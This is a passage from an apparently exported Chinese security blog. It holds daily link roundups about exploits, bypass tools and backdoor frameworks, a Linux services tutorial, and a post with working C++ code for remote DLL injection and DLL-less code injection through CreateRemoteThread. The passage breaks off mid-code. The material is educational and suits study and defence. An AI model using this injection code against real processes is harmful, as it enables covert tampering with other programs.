+ yaaw实现离线下载https://www.moerats.com/archives/219/ 我是如何利用一个假的私钥欺骗 Symantec 的https://blog.hboeck.de/archives/888-How-I-tricked-Symantec-with-a-Fake-Private-Key.html 浅谈bash command substitutionhttps://threathunter.org/topic/59748a779a9197870df2e989 小米九号平衡车国际版Ninebot mini PRO存在严重安全漏洞可被攻击者远程控制http://www.freebuf.com/news/141341.html 浅析OGNL表达式求值（S2003/005/009跟踪调试记录）https://xianzhi.aliyun.com/forum/read/1902.html 基于python的后门框架https://n0where.net/python-backdoor-framework-nxcrypt/ Cure53 对 Briar 项目应用与协议的渗透测试报告https://briarproject.org/raw/BRP-01-report.pdf 1是一个app安全的渗透测试报告，可以学习一下国外的app报告是怎么写的 SmoothCriminal - 从光标移动速度的角度检测沙盒https://github.com/G4lB1t/SmoothCriminal 开发安全的API所需要核对的清单https://github.com/shieldfy/API-Security-Checklist/blob/master/README-zh.md CVE-2012-1889 个人漏洞分析报告https://mp.weixin.qq.com/s?__biz=MjM5NTc2MDYxMw==&amp;mid=2458284116&amp;idx=1&amp;sn=4ae9de8a41b6a92b9b1cda29129733c6&amp;chksm=b18140de86f6c9c86f058016383461ba1f7c517bb3cdb306544b9a26fb579f6ce730809dbfc2&amp;scene=0&amp;key=749b9ba3255131eb780f072483cab23d06330774e27685ba5376b1c1ede36e90f85deef9fad3ef4ade0b3deea43faa7cf88eb8d6c7aeee6ddc40b40f1c2a1212d4aeb6bb2805a2a8ee44bae08b55acfd&amp;ascene=0&amp;uin=NzQxNDQ1&amp;devicetype=iMac+MacBookPro11%2C3+OSX+OSX+10.12.5+build(16F73)&amp;version=12020810&amp;nettype=WIFI&amp;fontScale=100&amp;pass_ticket=VOYpP3XMMVI9LX9HciKi5dGZ23kXs%2FckO5pCWaTycxs%3D htcap：一款实用的递归型Web漏洞扫描工具http://www.freebuf.com/sectool/140873.html]]></content>
  </entry>
  <entry>
    <title><![CDATA[20170721安全动态]]></title>
    <url>%2F2017%2F07%2F21%2F20170721%E5%AE%89%E5%85%A8%E5%8A%A8%E6%80%81%2F</url>
    <content type="text"><![CDATA[每日安全动态 应急响应-开机启动知识梳理http://vinc.top/2017/07/21/%E3%80%90%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94%E3%80%91%E5%BC%80%E6%9C%BA%E5%90%AF%E5%8A%A8%E7%9F%A5%E8%AF%86%E6%A2%B3%E7%90%86/ 反入侵之发现后门利用mount-bind将进程和端口信息隐匿http://www.freebuf.com/articles/network/140535.html 1测试了一下，效果还不错,此外还可以看看 mount --bind和硬链接的区别http://blog.csdn.net/shengxia1999/article/details/52060354 一步一步学ROP之linux_x64 X86篇http://static.hx99.net/static/drops/papers-7551.html最单纯的栈溢出http://wangzhixian.org/LinuxPwn/1.%E6%9C%80%E5%8D%95%E7%BA%AF%E7%9A%84%E6%A0%88%E6%BA%A2%E5%87%BA/article.htmlhttp://static.hx99.net/static/drops/tips-6597.html 1gcc -m32 在64位操作系统下编译生成32位的应用程序 Linux 内核分析http://www.cnblogs.com/scoyer/p/6411414.html php弱类型实战http://galaxylab.org/php-%E5%BC%B1%E7%B1%BB%E5%9E%8B%E5%AE%9E%E6%88%98/ Python 中的异步编程：Asynciohttp://python.jobbole.com/87988/ Linux PID 1 和 Systemdhttp://coolshell.cn/articles/17998.html 复原：一种防不胜防的USB攻击方式https://mp.weixin.qq.com/s?__biz=MzU4ODAwNzUwMQ==&amp;mid=2247483733&amp;idx=1&amp;sn=3643b0595d054f98498590c95827352a&amp;chksm=fde21077ca9599613914f570709d638e4e6bb3aab9dce4a1ba709a8c5e1855bd502fd6c32989&amp;scene=0&amp;key=51ed750aa8560dbfce4763b640a68de8d20a77d1f5f46ef62120dabe62c5328789d8444482df637bcd55ab4a2f41730aca50a3528bda0c6bd23f5debae5870651c79c6f36630d73b28eb688eefdc6222&amp;ascene=0&amp;uin=NzQxNDQ1&amp;devicetype=iMac+MacBookPro11%2C3+OSX+OSX+10.12.5+build(16F73)&amp;version=12020810&amp;nettype=WIFI&amp;fontScale=100&amp;pass_ticket=46YscstvNxflz1yJqboW6WnRXiW0yHa4E84bm3vD3Wg%3D 如何在未root的手机上安装漏洞利用框架RouterSploithttp://bobao.360.cn/learning/detail/4132.html 企业安全丨Ngx_Lua &amp; Fail2ban实现主动诱捕https://mp.weixin.qq.com/s?__biz=MzI5MzY2MzM0Mw==&amp;mid=2247483956&amp;idx=1&amp;sn=c7acc6b901985db81bbf4807c9cbca60&amp;chksm=ec6fe534db186c2291e9e1cc375cbc5bc5785214fecc7604a58081b2f76a57bbcd4917521a18&amp;mpshare=1&amp;scene=23&amp;srcid=0721Hgl1wB02XF4iNU1prxAO#rd 浅析PyCmd加密隐形木马http://www.freebuf.com/sectool/140421.html Some Ways To Create An Interactive Shell On Windowshttp://reverse-tcp.xyz/2017/05/27/Some-Ways-To-Create-An-Interactive-Shell-On-Windows/ 使用CSP Auditor构建内容安全策略配置http://gosecure.net/2017/07/20/building-a-content-security-policy-configuration-with-csp-auditor/ WinPayloads：一款可生成难以被检测到的payload之神奇工具http://www.freebuf.com/column/141024.html LaZagne — 支持多个操作系统的凭证恢复工具https://github.com/AlessandroZ/LaZagne MobSF：Mobile Security Frameworkhttps://github.com/MobSF/Mobile-Security-Framework-MobSF BrowserBackdoorhttps://github.com/IMcPwn/browser-backdoo 用户浏览器信息搜集 php版本https://n0where.net/info-gathering-via-user-browser/ ESET 对自2012年以来的一个极其隐蔽的大规模广告软件活动 - Stantinko 的分析https://www.welivesecurity.com/2017/07/20/stantinko-massive-adware-campaign-operating-covertly-since-2012 TrustZone 中的降级攻击（Paper）https://arxiv.org/pdf/1707.05082.pdf 《DNS Queries over HTTPS》草案，来自 IETFhttps://tools.ietf.org/html/draft-hoffman-dispatch-dns-over-https-00 Inject All the Things - DLL 注入的 7 种方法http://blog.deniable.org/blog/2017/07/16/inject-all-the-things/ WordPress 漏洞扫描工具 wpscan 2.9.3发布https://github.com/wpscanteam/wpscan/releases/tag/2.9.3 NtLoadEnclaveData Windows 10 RS3 DSE bypass PoC，利用 NtLoadEnclaveData 系统调用绕过 Windows 10 的签名强制检查https://gist.github.com/hfiref0x/1ac328a8e73d053012e02955d38e36a8 Windows 10 S 版本的 Device Guard 分析，来自 James Forshawhttps://tyranidslair.blogspot.com/2017/07/device-guard-on-windows-10-s_20.html 针对 Exchange 2003 邮件服务器的 EnglishmansDentist 漏洞利用分析https://blogs.technet.microsoft.com/srd/2017/07/20/englishmansdentist-exploit-analysis/ 1跟踪了一段时间的安全动态，发现没有什么软件或者系统是没有漏洞的... 了解 JavaScript 巨人所带来的风险，来自 ZDI 的一篇文章https://www.zerodayinitiative.com/blog/2017/7/18/understanding-risk-in-the-unintended-giant-javascript angularjs-csti-scanner - 用于自动化检测 AngularJS 客户端模板注入攻击的工具https://github.com/tijme/angularjs-csti-scanner PandwaRF vs PandwaRF Rogue: 暴力破解攻击https://www.youtube.com/watch?v=zKXKO7Zsa4Y]]></content>
      <categories>
        <category>每日安全动态</category>
      </categories>
  </entry>
  <entry>
    <title><![CDATA[linux系统服务]]></title>
    <url>%2F2017%2F07%2F20%2Flinux%E7%B3%BB%E7%BB%9F%E6%9C%8D%E5%8A%A1%2F</url>
    <content type="text"><![CDATA[0x01 前言虽然用过很长时间linux了，但是一些原理性的东西还是不是特别懂，这里就记录一下学习过程。 0x02 分类&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;简单的说，系统为了某些功能必须要提供一些服务 (不论是系统本身还是网络方面)，这个服务就称为 service 。 但是 service 的提供总是需要程序的运行吧！否则如何运行呢？所以达成这个 service 的程序我们就称呼他为 daemon 啰！ 举例来说，达成循环型例行性工作排程服务 (service) 的程序为 crond 这个 daemon 啦。&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;如果依据 daemon 的启动与管理方式来区分，基本上，可以将 daemon 分为可独立启动的 stand alone ， 与透过一支 super daemon 来统一管理的服务这两大类。 1231.stand_alone：此 daemon 可以自行单独启动服务就字面上的意思来说，stand alone 就是『独立的启动』的意思。这种类型的 daemon 可以自行启动而不必透过其他机制的管理； daemon 启动并加载到内存后就一直占用内存与系统资源。最大的优点就是：因为是一直存在内存内持续的提供服务， 因此对于发生客户端的要求时，stand alone 的 daemon 响应速度较快。常见的 stand alone daemon 有 WWW 的 daemon (httpd)、FTP 的 daemon (vsftpd) 等等。2.super daemon： 一支特殊的 daemon 来统一管理 如果以 daemon 提供服务的的工作状态来区分，又可以将 daemon 分为两大类，分别是： 123451.signal-control这种 daemon 是透过讯号来管理的，只要有任何客户端的需求进来，他就会立即启动去处理！例如打印机的服务 (cupsd)。 2.interval-control这种 daemon 则主要是『每隔一段时间就主动的去运行某项工作』，所以，你要作的是在配置文件指定服务要进行的时间与工作， 该服务在指定的时间才会去完成工作。 atd 与 crond 就属于这种类型的 daemon (每分钟侦测一次配置文件) 0x03 端口与服务&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;为了统一整个因特网的端口号对应服务的功能，好让所有的主机都能够使用相同的机制来提供服务与要求服务， 所以就有了『通讯协议』这玩意儿。也就是说，有些约定俗成的服务都放置在同一个埠号上面啦！举例来说， 网址列上面的 http 会让浏览器向 WWW 服务器的 80 埠号进行联机的要求！而 WWW 服务器也会将 httpd 这个软件激活在 port 80， 这样两者才能够达成联机的！ 嗯！那么想一想，系统上面有没有什么配置可以让服务与埠号对应在一起呢？那就是 /etc/services 啦！查找某个服务的端口像上面说的是，第一栏为 daemon 的名称、第二栏为该 daemon 所使用的端口号与网络数据封包协议， 封包协议主要为可靠联机的 TCP 封包以及较快速但为非面向连接的 UDP 封包。 举个例子说，那个远程联机机制使用的是 ssh 这个服务，而这个服务的使用的埠号为 22 ！就是这样啊！ 0x04 Daemon的启动脚本与启动方式&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;提供某个服务的 daemon 虽然只是一支程序而已，但是这支 daemon 的启动还是需要运行档、配置文件、运行环境等等， 举例来说，你可以查阅一下 httpd 这个程序 (man httpd) ，里面可谈到不少的选项与参数呢！此外，为了管理上面的方便， 所以通常 distribution 都会记录每一支 daemon 启动后所取得程序的 PID 在 /var/run/ 这个目录下呢！ 还有还有，在启动这些服务之前，你可能也要自行处理一下 daemon 能够顺利运行的环境是否正确等等。&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;为了解决上面谈到的问题，因此通常 distribution 会给我们一个简单的 shell script 来进行启动的功能。 该 script 可以进行环境的侦测、配置文件的分析、PID 文件的放置，以及相关重要交换文件案的锁住 (lock) 动作， 你只要运行该 script ，上述的动作就一口气连续的进行，最终就能够顺利且简单的启动这个 daemon。OK！那么这些 daemon 的启动脚本 (shell script) 放在哪里啊？ /etc/init.d/* ：启动脚本放置处系统上几乎所有的服务启动脚本都放置在这里！事实上这是公认的目录，我们的 CentOS 实际上放置在 /etc/rc.d/init.d/ 啦！ 不过还是有配置连结档到 /etc/init.d/ 的！既然这是公认的目录，因此建议您记忆这个目录即可！ /etc/sysconfig/* ：各服务的初始化环境配置文件几乎所有的服务都会将初始化的一些选项配置写入到这个目录下，举例来说，登录档的 syslog 这支 daemon 的初始化配置就写入在 /etc/sysconfig/syslog 这里呢！而网络的配置则写在 /etc/sysconfig/network 这个文件中。 所以，这个目录内的文件也是挺重要的； /etc/xinetd.conf, /etc/xinetd.d/ ：super daemon 配置文件super daemon 的主要配置文件 (其实是默认值) 为 /etc/xinetd.conf ，不过我们上面就谈到了， super daemon 只是一个统一管理的机制，他所管理的其他 daemon 的配置则写在 /etc/xinetd.d/ 里头 /etc/* ：各服务各自的配置文件配置文件都是放置在 /etc/ 底下的. /var/lib/* ：各服务产生的数据库一些会产生数据的服务都会将他的数据写入到 /var/lib/ 目录中。举例来说，数据库管理系统 MySQL 的数据库默认就是写入 /var/lib/mysql/ 这个目录下 /var/run/* ：各服务的程序之 PID 记录处既然 daemon 是程序，所以当然也可以利用 kill 或 killall 来管理啦！不过为了担心管理时影响到其他的程序， 因此 daemon 通常会将自己的 PID 记录一份到 /var/run/ 当中！例如登录文件的 PID 就记录在 /var/run/syslogd.pid 这个文件中。如此一来， /etc/init.d/syslog 就能够简单的管理自己的程序啰。 由于系统的环境都已经帮你制作妥当，所以利用 /etc/init.d/* 来启动、关闭与观察，就非常的简单！话虽如此， CentOS 还是有提供另外一支可以启动 stand alone 服务的脚本，那就是 service 这个程序。其实 service 仅是一支 script ，他可以分析你下达的 service 后面的参数，然后根据你的参数再到 /etc/init.d/ 去取得正确的服务来 start 或 stop0x05 Reference http://cn.linux.vbird.org/linux_basic/0560daemons.php]]></content>
  </entry>
  <entry>
    <title><![CDATA[20170720安全动态]]></title>
    <url>%2F2017%2F07%2F20%2F20170720%E5%AE%89%E5%85%A8%E5%8A%A8%E6%80%81%2F</url>
    <content type="text"><![CDATA[每日安全动态 Security solutions for Linux/Unix (Auditing, Hardening, Compliance)可以做linux服务的配置核查参考https://github.com/CISOfy CLR 在 SQL Server 中的利用技术分析https://cert.360.cn/files/CLR%E5%9C%A8SQL%20Server%E4%B8%AD%E7%9A%84%E5%88%A9%E7%94%A8%E6%8A%80%E6%9C%AF%E5%88%86%E6%9E%90.pdf Linux PID 1 和 Systemdhttp://coolshell.cn/articles/17998.html Fail2ban原理、安装、使用https://my.oschina.net/monkeyzhu/blog/418592https://www.polarxiong.com/archives/ubuntu-fail2ban.html Analyzing CVE-2017-9791: Apache Struts Vulnerability Can Lead to Remote Code Execution S2-048https://securingtomorrow.mcafee.com/mcafee-labs/analyzing-cve-2017-9791-apache-struts-vulnerability-can-lead-remote-code-execution/ 搭建一个 Fake AP 接入点的教程https://rootsh3ll.com/ultimate-fake-access-point-walkthrough/ quincy - 内存取证工具，从内存转储中检测代码注入攻击https://github.com/tbarabosch/quincy Brandis - Web 版的端到端加密应用https://github.com/brandis-project/brandis Use msxsl to bypass AppLocker,来自 3gstudent’s bloghttps://3gstudent.github.io/3gstudent.github.io/Use-msxsl-to-bypass-AppLocker/ 【木马分析】顺藤摸瓜：一个专黑建筑行业的QQ黏虫团伙现形记http://bobao.360.cn/learning/detail/4130.html 一篇文章告诉你黑客是如何控制你的人体平衡车的？http://thehackernews.com/2017/07/segway-hoverboard-hacking.html VMware Escape Exploithttps://github.com/unamer/vmware_escape DropboxC2C：后渗透代理，使用Dropbox Infrastructure进行命令和控制操作https://github.com/0x09AL/DropboxC2C postgresql 注入 渗透测试&#104;&#x74;&#116;&#x70;&#115;&#58;&#47;&#47;&#x6d;&#x65;&#x64;&#x69;&#x75;&#109;&#46;&#99;&#x6f;&#x6d;&#47;&#64;&#x70;&#97;&#110;&#97;&#x67;&#x69;&#x6f;&#x74;&#105;&#x73;&#56;&#x34;&#x2f;&#x61;&#x2d;&#112;&#101;&#110;&#x65;&#116;&#x72;&#x61;&#116;&#x69;&#x6f;&#x6e;&#x2d;&#x74;&#101;&#x73;&#116;&#x65;&#114;&#115;&#x2d;&#103;&#117;&#105;&#x64;&#101;&#45;&#116;&#x6f;&#45;&#x70;&#111;&#115;&#x74;&#x67;&#114;&#x65;&#115;&#x71;&#108;&#45;&#x65;&#48;&#x65;&#x61;&#102;&#x64;&#49;&#x61;&#x31;&#x30;&#x32;&#56; 新手入门：如何使用Burp进行Web应用漏洞扫描http://www.hackingarticles.in/vulnerability-analysis-web-application-using-burp-scanner/ script 命令记录ssh操作 1234567891011121314151617FROM DarkEvil的小密圈script -t 2&gt;demo.time -a demo.his scriptreplay demo.time demo.his利用script记录某人行为:script -t -f -q 2&gt;$USER.time -a $USER.his服务器安全审计:查看记录每个人对线上服务器的操作用户家目录下,修改环境变量，使得用户登录就会触发录像vi ~/.profilescript -t -f -q 2&gt;/wow/$USER-$UID-`date +%Y%m%d%H%M%S`.time -a /wow/$USER-$UID-`date +%Y%m%d%H%M%S`.his自己测试了一下，scriptreplay可以以类似视频的方式还原所有操作，源码见https://github.com/karelzak/util-linux/blob/master/term-utils/scriptreplay.c，觉得用来做蜜罐也不错:)]]></content>
  </entry>
  <entry>
    <title><![CDATA[20170719安全动态]]></title>
    <url>%2F2017%2F07%2F19%2F20170719%E5%AE%89%E5%85%A8%E5%8A%A8%E6%80%81%2F</url>
    <content type="text"><![CDATA[每日安全动态 SCADA - 一直被忽视的威胁https://www.yumpu.com/en/document/view/58975332/scada-threats-people-overlook GreatSCT - 用于生成绕过应用白名单的工具https://github.com/GreatSCT/GreatSCT sniff-probes - bash 脚本，用于嗅探 802.11 探测请求，获取对方历史连接过的 WIFI 网络名称https://github.com/brannondorsey/sniff-probes macOS软件安全工程师技能表https://m.weibo.cn/status/4130804521338030 利用USB RUBBER DUCKY（USB 橡皮鸭）在目标机器上启动Empire或Meterpreter会话https://www.sc0tfree.com/sc0tfree-blog/optimizing-rubber-ducky-attacks-with-empire-stagers HackerOne漏洞赏金平台经典案例点评及反思https://flexport.engineering/six-vulnerabilities-from-a-year-of-hackerone-808d8bfa0014]]></content>
  </entry>
  <entry>
    <title><![CDATA[20170718安全动态]]></title>
    <url>%2F2017%2F07%2F18%2F20170718%E5%AE%89%E5%85%A8%E5%8A%A8%E6%80%81%2F</url>
    <content type="text"><![CDATA[每日安全动态 用python和Tesseract实现光学字符识别(OCR)https://mp.weixin.qq.com/s?__biz=MjM5NzU0MzU0Nw==&amp;mid=2651375240&amp;idx=1&amp;sn=c06d1e2ea3e3d051dfc35e26fab9914e&amp;chksm=bd240d9c8a53848a24c16c3c71c8744454a83fead320766fa936907d2a4fee8e0f081ac43c63&amp;mpshare=1&amp;scene=23&amp;srcid=0718mRTQDHIURdgtL67qWZO3#rd mac上文字识别(Tesseract-OCR for mac )http://www.jianshu.com/p/016e55c25521http://www.cnblogs.com/wzben/p/5930538.html 如何挖掘Nginx日志中隐藏的金矿？https://mp.weixin.qq.com/s?__biz=MjM5MDE0Mjc4MA==&amp;mid=2650996987&amp;idx=1&amp;sn=165364365bb7684b4e953c2afcaf1ee7&amp;chksm=bdbef8a88ac971be6315ae77e2a0b5b11c55548dda07520d4dbd2416b87c7e8b8d37ebefc434&amp;mpshare=1&amp;scene=23&amp;srcid=07184mQjjjRCNzOMb4tO2hEo#rd CHAOS 框架http://b404.xyz/2017/07/17/chaos SQL注入之骚姿势小记https://mp.weixin.qq.com/s/ORsciwsBGQJhFdKqceprSw Android 应用安全检查清单https://github.com/b-mueller/android_app_security_checklist/blob/master/README.md 从 fuzzing Apache httpd server 到获得 1500刀奖励https://animal0day.blogspot.co.uk/2017/07/from-fuzzing-apache-httpd-server-to-cve.html XSStrike - Fuzz XSS 漏洞的工具，可以自动发现并绕过常见 WAFhttps://github.com/UltimateHackers/XSStrike 从 DNS 和 sinkhole 视角看 WannaCry 蠕虫，来自 360 网络安全实验室http://blog.netlab.360.com/wannacry-from-dns-and-sinkhole-view/ Cisco WebEx扩展再一次曝出远程代码执行漏洞http://thehackernews.com/2017/07/cisco-webex-vulnerability.html CVE-2017-4971:Spring Web Flow框架远程代码执行漏洞https://blog.gdssecurity.com/labs/2017/7/17/cve-2017-4971-remote-code-execution-vulnerability-in-the-spr.html nWatch：用于主机发现，端口扫描和操作系统指纹识别的工具https://github.com/suraj-root/nWatch 1展示效果比较的好 Volatility 2.6：高级内存取证框架https://github.com/volatilityfoundation/volatility PyREBox：基于Python 的逆向工程沙盒https://github.com/Cisco-Talos/pyrebox Mimikatz Videoshttps://blog.didierstevens.com/2017/07/15/mimikatz-videos/ IMSI-catcher：可以显示周围的手机的IMSI号码、国家、品牌和运营商的开源项目https://github.com/Oros42/IMSI-catcher 一个简单操作系统的实现http://www.cs.bham.ac.uk/~exr/lectures/opsys/10_11/lectures/os-dev.pdf 一个故事讲完httpshttps://mp.weixin.qq.com/s?__biz=MzAxOTc0NzExNg==&amp;mid=2665513779&amp;idx=1&amp;sn=a1de58690ad4f95111e013254a026ca2&amp;chksm=80d67b70b7a1f26697fa1626b3e9830dbdf4857d7a9528d22662f2e43af149265c4fd1b60024&amp;scene=0&amp;key=58e45431df36b4fbd24a4a6ec0b10d8266b056446a272f9ba75d4a3305a65c97708a352eaff3b055608065e62dbbfec4093b22253cd82069a623cc640697d7b85ac1b1ec994575835976f2bc80e09a72&amp;ascene=0&amp;uin=NzQxNDQ1&amp;devicetype=iMac+MacBookPro11%2C3+OSX+OSX+10.12.5+build(16F73)&amp;version=12020810&amp;nettype=WIFI&amp;fontScale=100&amp;pass_ticket=usvkh5PbHRaL4jEvg8EECSUWEIrySldKXdsBXuXlUtg%3D 用python进行图像识别的一本书https://www.pyimagesearch.com/practical-python-opencv/?src=resource-guide-conf Injecting Flaskhttps://nvisium.com/blog/2015/12/07/injecting-flask/1说到底还是拼接和模板会对&#123;&#123;var&#125;&#125;里的变量解析]]></content>
      <categories>
        <category>每日安全动态</category>
      </categories>
  </entry>
  <entry>
    <title><![CDATA[20170717安全动态]]></title>
    <url>%2F2017%2F07%2F17%2F20170717%E5%AE%89%E5%85%A8%E5%8A%A8%E6%80%81%2F</url>
    <content type="text"><![CDATA[每日安全动态 利用Simhash做URL去重的实现方式http://www.noblexu.com/%E5%88%A9%E7%94%A8Simhash%E5%81%9AURL%E5%8E%BB%E9%87%8D%E7%9A%84%E5%AE%9E%E7%8E%B0%E6%96%B9%E5%BC%8F/ Oauth 2.0之点我的链接就进入了你的账号http://ecma.io/764.html 从javascript脚本混淆说起http://www.freebuf.com/articles/system/140062.html Splash SSRF到获取内网服务器ROOT权限https://mp.weixin.qq.com/s/Ssk8CKF4EdUjZ0AIvOXKxw apparatus - IoT 网络安全性分析与可视化工具https://github.com/Or3stis/apparatus SMAP - 一款 shellcode 分析工具 http://www.kitploit.com/2017/07/smap-shellcode-mapper.html 锁定注册表键有几种方法？防止其他用户或进程修改或者删除 https://tyranidslair.blogspot.com/2017/07/locking-your-registry-keys-for-fun-and.html 如何利用 ETERNALROMANCE/SYNERGY 在 Windows Server 2016 上获取 Meterpreter Sessionhttps://www.exploit-db.com/docs/42329.pdf 基于 James Forshaw 的 Blog，PowerShell-Suite 套件中的一个 UAC Bypass PoChttps://github.com/FuzzySecurity/PowerShell-Suite/blob/master/UAC-TokenMagic.ps1 漏洞赏金猎人方法谈https://www.youtube.com/watch?v=C4ZHAdI8o1w 如何高效的进行子域名收集与筛选（以针对Yahoo! 的安全测试为例）&#104;&#116;&#116;&#x70;&#115;&#x3a;&#47;&#x2f;&#x6d;&#x65;&#x64;&#x69;&#117;&#x6d;&#x2e;&#99;&#x6f;&#109;&#x2f;&#64;&#119;&#x6f;&#x6a;&#x5f;&#99;&#105;&#x65;&#x63;&#104;&#x2f;&#104;&#111;&#x77;&#45;&#116;&#111;&#45;&#102;&#105;&#x6e;&#x64;&#x2d;&#105;&#x6e;&#116;&#101;&#114;&#110;&#97;&#108;&#45;&#115;&#x75;&#98;&#x64;&#111;&#109;&#x61;&#x69;&#110;&#x73;&#45;&#121;&#113;&#108;&#45;&#x79;&#97;&#x68;&#x6f;&#111;&#x2d;&#97;&#110;&#100;&#45;&#98;&#117;&#103;&#x2d;&#x62;&#111;&#117;&#110;&#116;&#121;&#x2d;&#x64;&#x37;&#55;&#51;&#x30;&#98;&#x33;&#55;&#x34;&#100;&#x37;&#55; yams：模块化安全框架（集成了实用的安全测试脚本及流行的开源项目）https://github.com/leesoh/yams 一个免费SSL证书的网站https://www.moerats.com/archives/214/ dork-cli – Command-line Google Dork Toolhttps://www.darknet.org.uk/2017/07/dork-cli-command-line-google-dork-tool/]]></content>
      <categories>
        <category>每日安全动态</category>
      </categories>
  </entry>
  <entry>
    <title><![CDATA[机器学习资源收集]]></title>
    <url>%2F2017%2F07%2F16%2F%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0%E8%B5%84%E6%BA%90%E6%94%B6%E9%9B%86%2F</url>
    <content type="text"><![CDATA[工具集合 http://www.hackingtutorials.org/wifi-hacking-tutorials/bypass-mac-filtering-on-wireless-networks/ Metasploit for Machine Learning: Deep-Pwninghttps://n0where.net/metasploit-for-machine-learning-deep-pwning/ 机器学习识别xsshttps://www.cdxy.me/?p=773 利用神经网络进行密码破解https://0day.work/using-neural-networks-for-password-cracking/http://www.ieeeconfpublishing.org/cpir/UploadedFiles/ver11.0.pdfhttp://machinelearningmastery.com/text-generation-lstm-recurrent-neural-networks-python-keras/]]></content>
      <categories>
        <category>工具整理</category>
      </categories>
  </entry>
  <entry>
    <title><![CDATA[DLL注入]]></title>
    <url>%2F2017%2F07%2F16%2Fwindows%20DLL%E6%B3%A8%E5%85%A5%2F</url>
    <content type="text"><![CDATA[概述DLL远程注入dll的注入和卸载关键性代码如下: 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120VOID CInjectDllDlg::InjectDll(DWORD dwPid, char *szDllName)&#123; if ( dwPid == 0 || lstrlen(szDllName) == 0 ) &#123; return ; &#125; char *pFunName = &quot;LoadLibraryA&quot;; // 打开目标进程 HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, dwPid); if ( hProcess == NULL ) &#123; return ; &#125; // 计算欲注入DLL文件完整路径的长度 int nDllLen = lstrlen(szDllName) + sizeof(char); // 在目标进程申请一块长度为nDllLen大小的内存空间 PVOID pDllAddr = VirtualAllocEx(hProcess, NULL, nDllLen, MEM_COMMIT, PAGE_READWRITE); if ( pDllAddr == NULL ) &#123; CloseHandle(hProcess); return ; &#125; DWORD dwWriteNum = 0; // 将欲注入DLL文件的完整路径写入在目标进程中申请的空间内 WriteProcessMemory(hProcess, pDllAddr, szDllName, nDllLen, &amp;dwWriteNum); // 获得LoadLibraryA()函数的地址 FARPROC pFunAddr = GetProcAddress(GetModuleHandle(&quot;kernel32.dll&quot;), pFunName); // 创建远程线程 HANDLE hThread = CreateRemoteThread(hProcess, NULL, 0, (LPTHREAD_START_ROUTINE)pFunAddr, pDllAddr, 0, NULL); WaitForSingleObject(hThread, INFINITE); CloseHandle(hThread); CloseHandle(hProcess);&#125;void CInjectDllDlg::OnBtnUninject() &#123; // TODO: Add your control notification handler code here char szDllName[MAX_PATH] = &#123; 0 &#125;; char szProcessName[MAXBYTE] = &#123; 0 &#125;; DWORD dwPid = 0; GetDlgItemText(IDC_EDIT_DLLFILE, szDllName, MAX_PATH); GetDlgItemText(IDC_EDIT_PROCESSNAME, szProcessName, MAXBYTE); // 由进程名获得PID dwPid = GetProcId(szProcessName); // 注入szDllName到dwPid UnInjectDll(dwPid, szDllName);&#125;VOID CInjectDllDlg::UnInjectDll(DWORD dwPid, char *szDllName)&#123; if ( dwPid == 0 || lstrlen(szDllName) == 0 ) &#123; return ; &#125; HANDLE hSnap = CreateToolhelp32Snapshot( TH32CS_SNAPMODULE, dwPid); MODULEENTRY32 me32; me32.dwSize = sizeof(me32); // 查找匹配的进程名称 BOOL bRet = Module32First(hSnap, &amp;me32); while ( bRet ) &#123; if ( lstrcmp(strupr(me32.szExePath), strupr(szDllName)) == 0 ) &#123; break; &#125; bRet = Module32Next(hSnap, &amp;me32); &#125; CloseHandle(hSnap); char *pFunName = &quot;FreeLibrary&quot;; HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, dwPid); if ( hProcess == NULL ) &#123; return ; &#125; FARPROC pFunAddr = GetProcAddress(GetModuleHandle(&quot;kernel32.dll&quot;), pFunName); HANDLE hThread = CreateRemoteThread(hProcess, NULL, 0, (LPTHREAD_START_ROUTINE)pFunAddr, me32.hModule, 0, NULL); WaitForSingleObject(hThread, INFINITE); CloseHandle(hThread); CloseHandle(hProcess);&#125; &nbsp;&nbsp;&nbsp;&nbsp; 整个注入与卸载的过程其实就是让远程线程执行一次LoadLibrary()函数或FreeLibrary()函数。 无DLL的代码注入 关键性代码： 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108typedef struct _DATA&#123; DWORD dwLoadLibrary; DWORD dwGetProcAddress; DWORD dwGetModuleHandle; DWORD dwGetModuleFileName; char User32Dll[STRLEN]; char MessageBox[STRLEN]; char Str[STRLEN];&#125;DATA, *PDATA;DWORD WINAPI RemoteThreadProc(LPVOID lpParam)&#123; PDATA pData = (PDATA)lpParam; // 定义API函数原型 HMODULE (__stdcall *MyLoadLibrary)(LPCTSTR); FARPROC (__stdcall *MyGetProcAddress)(HMODULE, LPCSTR); HMODULE (__stdcall *MyGetModuleHandle)(LPCTSTR); int (__stdcall *MyMessageBox)(HWND, LPCTSTR, LPCTSTR, UINT); DWORD (__stdcall *MyGetModuleFileName)(HMODULE, LPTSTR, DWORD); MyLoadLibrary = (HMODULE (__stdcall *)(LPCTSTR)) pData-&gt;dwLoadLibrary; MyGetProcAddress = (FARPROC (__stdcall *)(HMODULE, LPCSTR)) pData-&gt;dwGetProcAddress; MyGetModuleHandle = (HMODULE (__stdcall *)(LPCSTR)) pData-&gt;dwGetModuleHandle; MyGetModuleFileName = (DWORD (__stdcall *)(HMODULE, LPTSTR, DWORD)) pData-&gt;dwGetModuleFileName; HMODULE hModule = MyLoadLibrary(pData-&gt;User32Dll); MyMessageBox = (int (__stdcall *)(HWND, LPCTSTR, LPCTSTR, UINT)) MyGetProcAddress(hModule, pData-&gt;MessageBox); char szModuleFileName[MAX_PATH] = &#123; 0 &#125;; MyGetModuleFileName(NULL, szModuleFileName, MAX_PATH); MyMessageBox(NULL, pData-&gt;Str, szModuleFileName, MB_OK); return 0;&#125;VOID CNoDllInjectDlg::InjectCode(DWORD dwPid)&#123; // 